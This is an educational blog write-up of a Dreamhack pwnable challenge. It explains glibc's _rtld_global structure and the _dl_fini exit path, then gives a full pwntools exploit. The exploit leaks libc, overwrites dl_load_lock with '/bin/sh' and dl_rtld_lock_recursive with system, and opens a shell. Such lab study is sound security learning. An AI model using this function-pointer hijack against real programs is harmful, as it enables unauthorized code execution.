---
title: "[PWNABLE] rtld global"
description: "rtld global is a structure for managing code and variables when a program is executed and registered as a process. It is referenced at the point where execution ends. It can be checked when terminated by return. This is a simple practical example.#include int main(){ return 0; }If you check the binary __stack, you can see the main function call."
date: "2024-06-24"
translation_key: "tistory-6887f7a3f117"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-rtld-global"
private: false
---

### rtldglobal

This is a structure for managing code and variables when a program is executed and registered as a process.

It is referenced at the point where execution ends.

It can be checked when terminated by return.

This is a simple practice example.

```
#include <stdio.h>

int main(){
	return 0;
    }
```

![](/assets/images/tistory/tistory-6887f7a3f117/001.png)

If you check the binary \_\_stack, you can see that the main function call is made in \_\_libc\_start\_main.

In other words, when the main function ends, the return address is also \_\_libc\_start\_main.

Let's continue to step into here.

![](/assets/images/tistory/tistory-6887f7a3f117/002.png)

If you go a little deeper, a function called \_\_GI\_exit is called.

And then call \_\_run\_exit\_handlers.

Now, it depends on whether return is used at the end of the function or not.

Because this example uses it, the function \_dl\_fini is called.

![](/assets/images/tistory/tistory-6887f7a3f117/003.png)

According to the dreamhack explanation, the \_\_rtld\_lock\_lock\_recursive function is called here, but gdb says that in the above state

It goes to the \_\_GI\_\_exit function and ends.

```
# define __rtld_lock_lock_recursive(NAME) \
  GL(dl_rtld_lock_recursive) (&(NAME).mutex)
  
void
_dl_fini (void)
{
#ifdef SHARED
  int do_audit = 0;
 again:
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));
```

In the \_\_di\_fini function, call the recursive function with dl\_load\_lock as an argument.

 \_\_rtld\_lock\_lock\_recursive is used as a macro in the code as a function pointer called dl\_rtld\_lock\_recursive.

The pointer is called a member variable of the \_rtld\_global structure.

Let's take a look at the \_rtld\_global variable.

![](/assets/images/tistory/tistory-6887f7a3f117/004.png)

We are friends for quite a long time.

![](/assets/images/tistory/tistory-6887f7a3f117/005.png)

This is the definition of \_dl\_rtld\_lock\_recursive.

![](/assets/images/tistory/tistory-6887f7a3f117/006.png)

When viewed in a running state, the address of rtld\_lock\_default\_lock\_recursive is stored.

An attack is possible by modifying the memory using this part.

* * *

dreamhack \_rtld\_global problem

```
#include <stdio.h>
#include <stdlib.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  long addr;
  long data;
  int idx;

  init();

  printf("stdout: %p\n", stdout);
  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("addr: ");
        scanf("%ld", &addr);
        printf("data: ");
        scanf("%ld", &data);
        *(long long *)addr = data;
        break;
      default:
        return 0;
    }
  }
  return 0;
}
```

This is the problem code.

In case 1, you can see that a got overwrite vulnerability occurs.

Since the address of stdout is leaked, libc\_base can be obtained using that address.

Patch the libraries used using the patchelf command.

![](/assets/images/tistory/tistory-6887f7a3f117/007.png)

If you check with gdb, you can see that it has changed normally.

![](/assets/images/tistory/tistory-6887f7a3f117/008.png)

If you calculate the difference from the existing libc\_base, you get 0x3f1000.

![](/assets/images/tistory/tistory-6887f7a3f117/009.png)

\_rtld\_global address calculation process.

To find the offset of a member variable in a structure, you need a debugging symbol that contains structure and member variable information.

![](/assets/images/tistory/tistory-6887f7a3f117/010.png)

The detailed version of glibc is 2.27-3ubuntu1.

```
 wget http://launchpadlibrarian.net/365856914/libc6-dbg_2.27-3ubuntu1_amd64.deb
 
 dpkg -x libc6-dbg_2.27-3ubuntu1_amd64.deb ./
```

Download and extract the package appropriate for the version.

![](/assets/images/tistory/tistory-6887f7a3f117/011.png)

Now that we have the offset of the member variable, we can perform the attack.

This is the entire payload.

```
from pwn import*

p = process(['./ow_rtld'],env={'LD_PRELOAD':'./libc-2.27.so'})
e = ELF('./ow_rtld')
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')

context.log_level='debug'

p.recvuntil(b": ")
stdout = int(p.recvn(14),16)
print("stdout@add : ",hex(stdout))

stdout_offset = libc.sym['_IO_2_1_stdout_']
libc_base = stdout - stdout_offset
print("libc_base@add : ", hex(libc_base))

ld_base = libc_base + 0x3f1000
print("ld_base@add : ", hex(ld_base))

rtld_global = ld_base + ld.sym['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3840

print("rtld_global@add : ",hex(rtld_global))
print("dl_load_lock@add : ",hex(dl_load_lock))
print("dl_rtld_lock_recursive@add : ",hex(dl_rtld_lock_recursive))

system_offset = libc.sym['system']
system = libc_base + system_offset

def send(add,val):
    p.sendlineafter(b'>',b'1')
    p.sendlineafter(b'addr: ',str(add))
    p.sendlineafter(b'data: ',str(val))

send(dl_load_lock, u64('/bin/sh\x00'))

send(dl_rtld_lock_recursive,system)

p.sendlineafter(b'> ',b'2')

p.interactive()
```

![](/assets/images/tistory/tistory-6887f7a3f117/012.png)